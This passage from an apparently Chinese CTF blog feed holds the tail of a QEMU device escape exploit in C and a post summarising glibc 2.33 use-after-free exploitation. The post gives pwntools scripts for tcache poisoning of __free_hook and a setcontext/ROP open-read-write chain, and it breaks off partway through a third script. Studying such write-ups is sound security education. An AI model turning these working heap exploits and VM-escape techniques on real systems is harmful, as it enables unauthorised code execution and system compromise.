<a class="sourceLine" id="cb1-124" title="124">    userbuf = mmap(<span class="dv">0</span>, <span class="bn">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -<span class="dv">1</span>, <span class="dv">0</span>);</a>
<a class="sourceLine" id="cb1-125" title="125">    memset(userbuf,<span class="dv">0</span>,<span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb1-126" title="126">    phy_userbuf = va2pa(userbuf);</a>
<a class="sourceLine" id="cb1-127" title="127">    printf(<span class="st">&quot;[*] userbuf ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,userbuf);</a>
<a class="sourceLine" id="cb1-128" title="128">    printf(<span class="st">&quot;[*] phy_userbuf ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,phy_userbuf);</a>
<a class="sourceLine" id="cb1-129" title="129"></a>
<a class="sourceLine" id="cb1-130" title="130">    puts(<span class="st">&quot;[*] leak addr&quot;</span>);</a>
<a class="sourceLine" id="cb1-131" title="131">    dma_set_src(<span class="bn">0x40000</span>+<span class="bn">0x1000</span>);</a>
<a class="sourceLine" id="cb1-132" title="132">    dma_set_dst(phy_userbuf);</a>
<a class="sourceLine" id="cb1-133" title="133">    dma_set_cnt(<span class="bn">0x8</span>);</a>
<a class="sourceLine" id="cb1-134" title="134">    dma_set_cmd(<span class="bn">0x3</span>);</a>
<a class="sourceLine" id="cb1-135" title="135">    sleep(<span class="dv">1</span>);</a>
<a class="sourceLine" id="cb1-136" title="136"></a>
<a class="sourceLine" id="cb1-137" title="137">    <span class="dt">size_t</span> enc_addr = *(<span class="dt">size_t</span>*)userbuf;</a>
<a class="sourceLine" id="cb1-138" title="138">    printf(<span class="st">&quot;[*] enc_addr ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,enc_addr);</a>
<a class="sourceLine" id="cb1-139" title="139">    <span class="dt">size_t</span> qemu_base = enc_addr-<span class="bn">0x283dd0</span>;</a>
<a class="sourceLine" id="cb1-140" title="140">    printf(<span class="st">&quot;[*] qemu_base ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,qemu_base);</a>
<a class="sourceLine" id="cb1-141" title="141">    <span class="dt">size_t</span> system_plt = qemu_base+<span class="bn">0x1FDB18</span>;</a>
<a class="sourceLine" id="cb1-142" title="142">    printf(<span class="st">&quot;[*] system_plt ==&gt; 0x%llx</span><span class="sc">\n</span><span class="st">&quot;</span>,system_plt);</a>
<a class="sourceLine" id="cb1-143" title="143"></a>
<a class="sourceLine" id="cb1-144" title="144">    puts(<span class="st">&quot;[*] edit enc ==&gt; system@plt&quot;</span>);</a>
<a class="sourceLine" id="cb1-145" title="145">    dma_do_write(<span class="bn">0x40000</span>+<span class="bn">0x1000</span>, &amp;system_plt, <span class="bn">0x8</span>);</a>
<a class="sourceLine" id="cb1-146" title="146"></a>
<a class="sourceLine" id="cb1-147" title="147">    puts(<span class="st">&quot;[*] set &#39;cat flag&#39; &quot;</span>);</a>
<a class="sourceLine" id="cb1-148" title="148">    <span class="dt">char</span>* catflag = <span class="st">&quot;cat ./flag</span><span class="sc">\x00\x00</span><span class="st">&quot;</span>;</a>
<a class="sourceLine" id="cb1-149" title="149">    dma_do_write(<span class="bn">0x200</span>+<span class="bn">0x40000</span>, catflag, <span class="dv">12</span>);</a>
<a class="sourceLine" id="cb1-150" title="150">    <span class="co">// pause();</span></a>
<a class="sourceLine" id="cb1-151" title="151">    puts(<span class="st">&quot;[*] enc &#39;cat flag&#39; &quot;</span>);</a>
<a class="sourceLine" id="cb1-152" title="152">    dma_do_enc(<span class="bn">0x200</span>+<span class="bn">0x40000</span>, <span class="dv">8</span>);</a>
<a class="sourceLine" id="cb1-153" title="153"></a>
<a class="sourceLine" id="cb1-154" title="154">    <span class="cf">return</span> <span class="dv">0</span>;</a>
<a class="sourceLine" id="cb1-155" title="155">}</a></code></pre></div>]]></description>
    <pubDate>Wed, 23 Nov 2022 15:32:04 +0800</pubDate>
  </item>
   
  <item>
    <title><![CDATA[ Glibc-2.33 UAF利用总结]]></title>
    <link>https://blog.mark0519.com/#//#/pwnable/220703-glibc-233UAF</link>
    <guid isPermaLink="false">https://blog.mark0519.com/#//#/pwnable/220703-glibc-233UAF</guid>
    <description><![CDATA[<h1 id="glibc-2.33-uaf利用总结">Glibc-2.33 UAF利用总结</h1>
<blockquote>
<p>最近老是能遇到2.33的题。。。</p>
</blockquote>
<h2 id="x00-无限制uaf">0x00 无限制UAF</h2>
<p>没有限制的UAF没啥好说的，泄露libc和key，tcache打任意一个hook实现利用</p>
<blockquote>
<p>Tcahe和Fastbin的fd都被异或加密过，保存的fd = 真实fd^(当前堆地址&lt;&lt;12)</p>
</blockquote>
<div class="sourceCode" id="cb1"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb1-1" title="1"><span class="co"># -*- coding: utf-8 -*-</span></a>
<a class="sourceLine" id="cb1-2" title="2"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
<a class="sourceLine" id="cb1-3" title="3">context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</a>
<a class="sourceLine" id="cb1-4" title="4">context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></a>
<a class="sourceLine" id="cb1-5" title="5">libc <span class="op">=</span> ELF(<span class="st">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)</a>
<a class="sourceLine" id="cb1-6" title="6">elf <span class="op">=</span> ELF(<span class="st">&quot;./pwn&quot;</span>)</a>
<a class="sourceLine" id="cb1-7" title="7"></a>
<a class="sourceLine" id="cb1-8" title="8">local <span class="op">=</span> <span class="dv">1</span></a>
<a class="sourceLine" id="cb1-9" title="9"></a>
<a class="sourceLine" id="cb1-10" title="10"><span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb1-11" title="11">    p <span class="op">=</span> process(<span class="st">&quot;./pwn&quot;</span>)    </a>
<a class="sourceLine" id="cb1-12" title="12"><span class="cf">else</span>:</a>
<a class="sourceLine" id="cb1-13" title="13">    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</a>
<a class="sourceLine" id="cb1-14" title="14"></a>
<a class="sourceLine" id="cb1-15" title="15"><span class="kw">def</span> debug(p):</a>
<a class="sourceLine" id="cb1-16" title="16">    <span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb1-17" title="17">        gdb.attach(p)</a>
<a class="sourceLine" id="cb1-18" title="18">    <span class="cf">else</span>:</a>
<a class="sourceLine" id="cb1-19" title="19">        <span class="cf">pass</span></a>
<a class="sourceLine" id="cb1-20" title="20"></a>
<a class="sourceLine" id="cb1-21" title="21"><span class="kw">def</span> cmd(i):</a>
<a class="sourceLine" id="cb1-22" title="22">    p.sendlineafter(<span class="st">&quot;choice:&quot;</span>,<span class="bu">str</span>(i))</a>
<a class="sourceLine" id="cb1-23" title="23"></a>
<a class="sourceLine" id="cb1-24" title="24"><span class="kw">def</span> add(size,data):</a>
<a class="sourceLine" id="cb1-25" title="25">    cmd(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb1-26" title="26">    p.sendlineafter(<span class="st">&quot;Size:&quot;</span>,<span class="bu">str</span>(size))</a>
<a class="sourceLine" id="cb1-27" title="27">    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</a>
<a class="sourceLine" id="cb1-28" title="28"></a>
<a class="sourceLine" id="cb1-29" title="29"><span class="kw">def</span> show(idx):</a>
<a class="sourceLine" id="cb1-30" title="30">    cmd(<span class="dv">4</span>)</a>
<a class="sourceLine" id="cb1-31" title="31">    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</a>
<a class="sourceLine" id="cb1-32" title="32"></a>
<a class="sourceLine" id="cb1-33" title="33"><span class="kw">def</span> delete(idx):</a>
<a class="sourceLine" id="cb1-34" title="34">    cmd(<span class="dv">2</span>)</a>
<a class="sourceLine" id="cb1-35" title="35">    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</a>
<a class="sourceLine" id="cb1-36" title="36"></a>
<a class="sourceLine" id="cb1-37" title="37"><span class="kw">def</span> edit(idx,data):</a>
<a class="sourceLine" id="cb1-38" title="38">    cmd(<span class="dv">3</span>)</a>
<a class="sourceLine" id="cb1-39" title="39">    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</a>
<a class="sourceLine" id="cb1-40" title="40">    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</a>
<a class="sourceLine" id="cb1-41" title="41"></a>
<a class="sourceLine" id="cb1-42" title="42">add(<span class="bn">0x500</span>,<span class="st">&quot;0000&quot;</span>) <span class="co">#0</span></a>
<a class="sourceLine" id="cb1-43" title="43">add(<span class="bn">0x70</span>,<span class="st">&quot;1111&quot;</span>) <span class="co">#1</span></a>
<a class="sourceLine" id="cb1-44" title="44">add(<span class="bn">0x70</span>,<span class="st">&quot;2222&quot;</span>) <span class="co">#2</span></a>
<a class="sourceLine" id="cb1-45" title="45">add(<span class="bn">0x70</span>,<span class="st">&quot;3333&quot;</span>) <span class="co">#3</span></a>
<a class="sourceLine" id="cb1-46" title="46"></a>
<a class="sourceLine" id="cb1-47" title="47">delete(<span class="dv">0</span>)</a>
<a class="sourceLine" id="cb1-48" title="48">show(<span class="dv">0</span>) <span class="co"># leak libc</span></a>
<a class="sourceLine" id="cb1-49" title="49">p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb1-50" title="50">libc.address <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span><span class="dv">96</span><span class="op">-</span>libc.sym[<span class="st">&#39;__malloc_hook&#39;</span>]<span class="op">-</span><span class="bn">0x10</span></a>
<a class="sourceLine" id="cb1-51" title="51"><span class="bu">print</span> <span class="bu">hex</span>(libc.address)</a>
<a class="sourceLine" id="cb1-52" title="52">delete(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb1-53" title="53">show(<span class="dv">1</span>) <span class="co"># leak heap &amp; key</span></a>
<a class="sourceLine" id="cb1-54" title="54">p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb1-55" title="55">heap_base <span class="op">=</span> (u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">&lt;&lt;</span><span class="dv">12</span>)<span class="op">-</span><span class="bn">0x1000</span></a>
<a class="sourceLine" id="cb1-56" title="56"><span class="bu">print</span> <span class="bu">hex</span>(heap_base)</a>
<a class="sourceLine" id="cb1-57" title="57">delete(<span class="dv">2</span>)</a>
<a class="sourceLine" id="cb1-58" title="58">key <span class="op">=</span> (heap_base<span class="op">+</span><span class="bn">0x1840</span>)<span class="op">&gt;&gt;</span><span class="dv">12</span></a>
<a class="sourceLine" id="cb1-59" title="59">fd <span class="op">=</span> key<span class="op">^</span>libc.sym[<span class="st">&#39;__free_hook&#39;</span>]</a>
<a class="sourceLine" id="cb1-60" title="60">edit(<span class="dv">2</span>,p64(fd)<span class="op">+</span>p64(<span class="dv">0</span>))</a>
<a class="sourceLine" id="cb1-61" title="61">add(<span class="bn">0x70</span>,<span class="st">&quot;/bin/sh</span><span class="ch">\x00</span><span class="st">&quot;</span>) <span class="co">#4</span></a>
<a class="sourceLine" id="cb1-62" title="62">add(<span class="bn">0x70</span>,p64(libc.sym[<span class="st">&#39;system&#39;</span>])) <span class="co">#5</span></a>
<a class="sourceLine" id="cb1-63" title="63">delete(<span class="dv">4</span>)</a>
<a class="sourceLine" id="cb1-64" title="64"><span class="co"># debug(p)</span></a>
<a class="sourceLine" id="cb1-65" title="65">p.interactive()</a></code></pre></div>
<h2 id="x01-无限制uaf-orw">0x01 无限制UAF-ORW</h2>
<p>对高版本ORW来说，主要是寻找好用的magic gadget，这里先放两个：</p>
<p>方法一：修改rdx到rdi来调用context+61</p>
<pre class="assembly"><code>mov rdx, qword ptr [rdi + 8] 
mov qword ptr [rsp], rax 
call qword ptr [rdx + 0x20]</code></pre>
<p>方法二：修改rax+28为leave；ret进制栈迁移</p>
<pre class="assembly"><code>mov rbp, qword ptr [rdi + 0x48]; 
mov rax, qword ptr [rbp + 0x18]; 
lea r13, [rbp + 0x10]; 
mov dword ptr [rbp + 0x10], 0; 
mov rdi, r13; 
call qword ptr [rax + 0x28];</code></pre>
<p>方法三：泄露栈地址__environ直接修改返回rop</p>
<h3 id="方法一修改rdx到rdi">方法一、修改rdx到rdi</h3>
<div class="sourceCode" id="cb4"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb4-1" title="1"><span class="co"># -*- coding: utf-8 -*-</span></a>
<a class="sourceLine" id="cb4-2" title="2"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
<a class="sourceLine" id="cb4-3" title="3">context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</a>
<a class="sourceLine" id="cb4-4" title="4">context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></a>
<a class="sourceLine" id="cb4-5" title="5">libc <span class="op">=</span> ELF(<span class="st">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)</a>
<a class="sourceLine" id="cb4-6" title="6">elf <span class="op">=</span> ELF(<span class="st">&quot;./pwn&quot;</span>)</a>
<a class="sourceLine" id="cb4-7" title="7"></a>
<a class="sourceLine" id="cb4-8" title="8">local <span class="op">=</span> <span class="dv">1</span></a>
<a class="sourceLine" id="cb4-9" title="9"></a>
<a class="sourceLine" id="cb4-10" title="10"><span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb4-11" title="11">    p <span class="op">=</span> process(<span class="st">&quot;./pwn&quot;</span>)    </a>
<a class="sourceLine" id="cb4-12" title="12"><span class="cf">else</span>:</a>
<a class="sourceLine" id="cb4-13" title="13">    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</a>
<a class="sourceLine" id="cb4-14" title="14"></a>
<a class="sourceLine" id="cb4-15" title="15"><span class="kw">def</span> debug(p):</a>
<a class="sourceLine" id="cb4-16" title="16">    <span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb4-17" title="17">        gdb.attach(p)</a>
<a class="sourceLine" id="cb4-18" title="18">    <span class="cf">else</span>:</a>
<a class="sourceLine" id="cb4-19" title="19">        <span class="cf">pass</span></a>
<a class="sourceLine" id="cb4-20" title="20"></a>
<a class="sourceLine" id="cb4-21" title="21"><span class="kw">def</span> cmd(i):</a>
<a class="sourceLine" id="cb4-22" title="22">    p.sendlineafter(<span class="st">&quot;choice:&quot;</span>,<span class="bu">str</span>(i))</a>
<a class="sourceLine" id="cb4-23" title="23"></a>
<a class="sourceLine" id="cb4-24" title="24"><span class="kw">def</span> add(size,data):</a>
<a class="sourceLine" id="cb4-25" title="25">    cmd(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb4-26" title="26">    p.sendlineafter(<span class="st">&quot;Size:&quot;</span>,<span class="bu">str</span>(size))</a>
<a class="sourceLine" id="cb4-27" title="27">    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</a>
<a class="sourceLine" id="cb4-28" title="28"></a>
<a class="sourceLine" id="cb4-29" title="29"><span class="kw">def</span> show(idx):</a>
<a class="sourceLine" id="cb4-30" title="30">    cmd(<span class="dv">4</span>)</a>
<a class="sourceLine" id="cb4-31" title="31">    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</a>
<a class="sourceLine" id="cb4-32" title="32"></a>
<a class="sourceLine" id="cb4-33" title="33"><span class="kw">def</span> delete(idx):</a>
<a class="sourceLine" id="cb4-34" title="34">    cmd(<span class="dv">2</span>)</a>
<a class="sourceLine" id="cb4-35" title="35">    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</a>
<a class="sourceLine" id="cb4-36" title="36"></a>
<a class="sourceLine" id="cb4-37" title="37"><span class="kw">def</span> edit(idx,data):</a>
<a class="sourceLine" id="cb4-38" title="38">    cmd(<span class="dv">3</span>)</a>
<a class="sourceLine" id="cb4-39" title="39">    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</a>
<a class="sourceLine" id="cb4-40" title="40">    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</a>
<a class="sourceLine" id="cb4-41" title="41"></a>
<a class="sourceLine" id="cb4-42" title="42"></a>
<a class="sourceLine" id="cb4-43" title="43">add(<span class="bn">0x500</span>,<span class="st">&quot;0000&quot;</span>) <span class="co">#0</span></a>
<a class="sourceLine" id="cb4-44" title="44">add(<span class="bn">0x70</span>,<span class="st">&quot;1111&quot;</span>) <span class="co">#1</span></a>
<a class="sourceLine" id="cb4-45" title="45">add(<span class="bn">0x70</span>,<span class="st">&quot;2222&quot;</span>) <span class="co">#2</span></a>
<a class="sourceLine" id="cb4-46" title="46">add(<span class="bn">0x70</span>,<span class="st">&quot;3333&quot;</span>) <span class="co">#3</span></a>
<a class="sourceLine" id="cb4-47" title="47"></a>
<a class="sourceLine" id="cb4-48" title="48"></a>
<a class="sourceLine" id="cb4-49" title="49">delete(<span class="dv">0</span>)</a>
<a class="sourceLine" id="cb4-50" title="50">show(<span class="dv">0</span>) <span class="co"># leak libc</span></a>
<a class="sourceLine" id="cb4-51" title="51">p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb4-52" title="52">libc.address <span class="op">=</span> u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">-</span><span class="dv">96</span><span class="op">-</span>libc.sym[<span class="st">&#39;__malloc_hook&#39;</span>]<span class="op">-</span><span class="bn">0x10</span></a>
<a class="sourceLine" id="cb4-53" title="53"><span class="bu">print</span> <span class="bu">hex</span>(libc.address)</a>
<a class="sourceLine" id="cb4-54" title="54">delete(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb4-55" title="55">show(<span class="dv">1</span>) <span class="co"># leak heap &amp; key</span></a>
<a class="sourceLine" id="cb4-56" title="56">p.recvuntil(<span class="st">&quot;Data:</span><span class="ch">\n</span><span class="st">&quot;</span>)</a>
<a class="sourceLine" id="cb4-57" title="57">heap_base <span class="op">=</span> (u64(p.recv(<span class="dv">6</span>).ljust(<span class="dv">8</span>,<span class="st">&#39;</span><span class="ch">\x00</span><span class="st">&#39;</span>))<span class="op">&lt;&lt;</span><span class="dv">12</span>)<span class="op">-</span><span class="bn">0x1000</span></a>
<a class="sourceLine" id="cb4-58" title="58"><span class="bu">print</span> <span class="bu">hex</span>(heap_base)</a>
<a class="sourceLine" id="cb4-59" title="59">delete(<span class="dv">2</span>)</a>
<a class="sourceLine" id="cb4-60" title="60">key <span class="op">=</span> (heap_base<span class="op">+</span><span class="bn">0x1840</span>)<span class="op">&gt;&gt;</span><span class="dv">12</span></a>
<a class="sourceLine" id="cb4-61" title="61">fd <span class="op">=</span> key<span class="op">^</span>libc.sym[<span class="st">&#39;__free_hook&#39;</span>]</a>
<a class="sourceLine" id="cb4-62" title="62">edit(<span class="dv">2</span>,p64(fd)<span class="op">+</span>p64(<span class="dv">0</span>))</a>
<a class="sourceLine" id="cb4-63" title="63"></a>
<a class="sourceLine" id="cb4-64" title="64">magic <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x14a0a0</span></a>
<a class="sourceLine" id="cb4-65" title="65">setcontext <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x529ad</span></a>
<a class="sourceLine" id="cb4-66" title="66">heap <span class="op">=</span> heap_base<span class="op">+</span><span class="bn">0x1940</span></a>
<a class="sourceLine" id="cb4-67" title="67">rop_addr <span class="op">=</span> heap<span class="op">+</span><span class="bn">0xb0</span></a>
<a class="sourceLine" id="cb4-68" title="68"></a>
<a class="sourceLine" id="cb4-69" title="69">pop_rdi <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x0000000000028a55</span></a>
<a class="sourceLine" id="cb4-70" title="70">pop_rsi <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x000000000002a4cf</span></a>
<a class="sourceLine" id="cb4-71" title="71">pop_rdx <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x00000000000c7f32</span></a>
<a class="sourceLine" id="cb4-72" title="72">pop_rax <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x0000000000044c70</span></a>
<a class="sourceLine" id="cb4-73" title="73">syscall <span class="op">=</span> libc.address<span class="op">+</span><span class="bn">0x000000000006105a</span></a>
<a class="sourceLine" id="cb4-74" title="74"></a>
<a class="sourceLine" id="cb4-75" title="75">rop <span class="op">=</span> p64(pop_rdi)</a>
<a class="sourceLine" id="cb4-76" title="76">rop <span class="op">+=</span>p64(heap)</a>
<a class="sourceLine" id="cb4-77" title="77">rop <span class="op">+=</span>p64(pop_rsi)</a>
<a class="sourceLine" id="cb4-78" title="78">rop <span class="op">+=</span>p64(<span class="dv">0</span>)</a>
<a class="sourceLine" id="cb4-79" title="79">rop <span class="op">+=</span>p64(pop_rdx)</a>
<a class="sourceLine" id="cb4-80" title="80">rop <span class="op">+=</span>p64(<span class="dv">0</span>)</a>
<a class="sourceLine" id="cb4-81" title="81">rop <span class="op">+=</span>p64(pop_rax)</a>
<a class="sourceLine" id="cb4-82" title="82">rop <span class="op">+=</span>p64(<span class="dv">2</span>)</a>
<a class="sourceLine" id="cb4-83" title="83">rop <span class="op">+=</span>p64(syscall)</a>
<a class="sourceLine" id="cb4-84" title="84"></a>
<a class="sourceLine" id="cb4-85" title="85">rop <span class="op">+=</span>p64(pop_rdi)</a>
<a class="sourceLine" id="cb4-86" title="86">rop <span class="op">+=</span>p64(<span class="dv">3</span>)</a>
<a class="sourceLine" id="cb4-87" title="87">rop <span class="op">+=</span>p64(pop_rsi)</a>
<a class="sourceLine" id="cb4-88" title="88">rop <span class="op">+=</span>p64(heap<span class="bn">-0x30</span>)</a>
<a class="sourceLine" id="cb4-89" title="89">rop <span class="op">+=</span>p64(pop_rdx)</a>
<a class="sourceLine" id="cb4-90" title="90">rop <span class="op">+=</span>p64(<span class="bn">0x30</span>)</a>
<a class="sourceLine" id="cb4-91" title="91">rop <span class="op">+=</span>p64(pop_rax)</a>
<a class="sourceLine" id="cb4-92" title="92">rop <span class="op">+=</span>p64(<span class="dv">0</span>)</a>
<a class="sourceLine" id="cb4-93" title="93">rop <span class="op">+=</span>p64(syscall)</a>
<a class="sourceLine" id="cb4-94" title="94"></a>
<a class="sourceLine" id="cb4-95" title="95">rop <span class="op">+=</span>p64(pop_rdi)</a>
<a class="sourceLine" id="cb4-96" title="96">rop <span class="op">+=</span>p64(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb4-97" title="97">rop <span class="op">+=</span>p64(pop_rax)</a>
<a class="sourceLine" id="cb4-98" title="98">rop <span class="op">+=</span>p64(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb4-99" title="99">rop <span class="op">+=</span>p64(syscall)</a>
<a class="sourceLine" id="cb4-100" title="100"></a>
<a class="sourceLine" id="cb4-101" title="101">add(<span class="bn">0x600</span>,<span class="st">&quot;./flag</span><span class="ch">\x00\x00</span><span class="st">&quot;</span><span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">*</span><span class="dv">3</span><span class="op">+</span>p64(setcontext)<span class="op">+</span>p64(<span class="dv">0</span>)<span class="op">*</span><span class="dv">15</span><span class="op">+</span>p64(rop_addr)<span class="op">+</span>rop) <span class="co">#4</span></a>
<a class="sourceLine" id="cb4-102" title="102">add(<span class="bn">0x70</span>,p64(<span class="dv">0</span>)<span class="op">+</span>p64(heap)) <span class="co">#5</span></a>
<a class="sourceLine" id="cb4-103" title="103"><span class="bu">print</span> <span class="bu">hex</span>(setcontext)</a>
<a class="sourceLine" id="cb4-104" title="104"></a>
<a class="sourceLine" id="cb4-105" title="105">debug(p)</a>
<a class="sourceLine" id="cb4-106" title="106"></a>
<a class="sourceLine" id="cb4-107" title="107">add(<span class="bn">0x70</span>,p64(magic)) <span class="co">#6</span></a>
<a class="sourceLine" id="cb4-108" title="108">delete(<span class="dv">5</span>)</a>
<a class="sourceLine" id="cb4-109" title="109"><span class="co"># debug(p)</span></a>
<a class="sourceLine" id="cb4-110" title="110">p.interactive()</a>
<a class="sourceLine" id="cb4-111" title="111"></a>
<a class="sourceLine" id="cb4-112" title="112"><span class="co">&#39;&#39;&#39;</span></a>
<a class="sourceLine" id="cb4-113" title="113"><span class="co">0x000000000014a0a0 :mov rdx, qword ptr [rdi + 8] ;</span></a>
<a class="sourceLine" id="cb4-114" title="114"><span class="co">                    mov qword ptr [rsp], rax ; </span></a>
<a class="sourceLine" id="cb4-115" title="115"><span class="co">                    call qword ptr [rdx + 0x20]</span></a>
<a class="sourceLine" id="cb4-116" title="116"><span class="co">&#39;&#39;&#39;</span></a></code></pre></div>
<h3 id="方法二栈迁移">方法二、栈迁移</h3>
<p>由于栈迁移完之后只有0x10字节的空余可以填写rop，之后就会遇到之前填充的内容，所以可以给之前填充的内容都给pop到任意一个寄存器中去从而跳过垃圾字节。</p>
<div class="sourceCode" id="cb5"><pre class="sourceCode python"><code class="sourceCode python"><a class="sourceLine" id="cb5-1" title="1"><span class="co"># -*- coding: utf-8 -*-</span></a>
<a class="sourceLine" id="cb5-2" title="2"><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></a>
<a class="sourceLine" id="cb5-3" title="3">context(os<span class="op">=</span><span class="st">&#39;linux&#39;</span>,arch<span class="op">=</span><span class="st">&#39;amd64&#39;</span>)</a>
<a class="sourceLine" id="cb5-4" title="4">context.log_level <span class="op">=</span> <span class="st">&#39;debug&#39;</span></a>
<a class="sourceLine" id="cb5-5" title="5">libc <span class="op">=</span> ELF(<span class="st">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)</a>
<a class="sourceLine" id="cb5-6" title="6">elf <span class="op">=</span> ELF(<span class="st">&quot;./pwn&quot;</span>)</a>
<a class="sourceLine" id="cb5-7" title="7"></a>
<a class="sourceLine" id="cb5-8" title="8">local <span class="op">=</span> <span class="dv">1</span></a>
<a class="sourceLine" id="cb5-9" title="9"></a>
<a class="sourceLine" id="cb5-10" title="10"><span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb5-11" title="11">    p <span class="op">=</span> process(<span class="st">&quot;./pwn&quot;</span>)    </a>
<a class="sourceLine" id="cb5-12" title="12"><span class="cf">else</span>:</a>
<a class="sourceLine" id="cb5-13" title="13">    p <span class="op">=</span> remote(<span class="st">&quot;&quot;</span>,<span class="st">&quot;&quot;</span>)</a>
<a class="sourceLine" id="cb5-14" title="14"></a>
<a class="sourceLine" id="cb5-15" title="15"><span class="kw">def</span> debug(p):</a>
<a class="sourceLine" id="cb5-16" title="16">    <span class="cf">if</span> local:</a>
<a class="sourceLine" id="cb5-17" title="17">        gdb.attach(p)</a>
<a class="sourceLine" id="cb5-18" title="18">    <span class="cf">else</span>:</a>
<a class="sourceLine" id="cb5-19" title="19">        <span class="cf">pass</span></a>
<a class="sourceLine" id="cb5-20" title="20"></a>
<a class="sourceLine" id="cb5-21" title="21"><span class="kw">def</span> cmd(i):</a>
<a class="sourceLine" id="cb5-22" title="22">    p.sendlineafter(<span class="st">&quot;choice:&quot;</span>,<span class="bu">str</span>(i))</a>
<a class="sourceLine" id="cb5-23" title="23"></a>
<a class="sourceLine" id="cb5-24" title="24"><span class="kw">def</span> add(size,data):</a>
<a class="sourceLine" id="cb5-25" title="25">    cmd(<span class="dv">1</span>)</a>
<a class="sourceLine" id="cb5-26" title="26">    p.sendlineafter(<span class="st">&quot;Size:&quot;</span>,<span class="bu">str</span>(size))</a>
<a class="sourceLine" id="cb5-27" title="27">    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</a>
<a class="sourceLine" id="cb5-28" title="28"></a>
<a class="sourceLine" id="cb5-29" title="29"><span class="kw">def</span> show(idx):</a>
<a class="sourceLine" id="cb5-30" title="30">    cmd(<span class="dv">4</span>)</a>
<a class="sourceLine" id="cb5-31" title="31">    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</a>
<a class="sourceLine" id="cb5-32" title="32"></a>
<a class="sourceLine" id="cb5-33" title="33"><span class="kw">def</span> delete(idx):</a>
<a class="sourceLine" id="cb5-34" title="34">    cmd(<span class="dv">2</span>)</a>
<a class="sourceLine" id="cb5-35" title="35">    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</a>
<a class="sourceLine" id="cb5-36" title="36"></a>
<a class="sourceLine" id="cb5-37" title="37"><span class="kw">def</span> edit(idx,data):</a>
<a class="sourceLine" id="cb5-38" title="38">    cmd(<span class="dv">3</span>)</a>
<a class="sourceLine" id="cb5-39" title="39">    p.sendlineafter(<span class="st">&quot;Idx:&quot;</span>,<span class="bu">str</span>(idx))</a>
<a class="sourceLine" id="cb5-40" title="40">    p.sendlineafter(<span class="st">&quot;Data:&quot;</span>,data)</a>
<a class="sourceLine" id="cb5-41" title="41"></a>
<a class="sourceLine" id="cb5-42" title="42"></a>
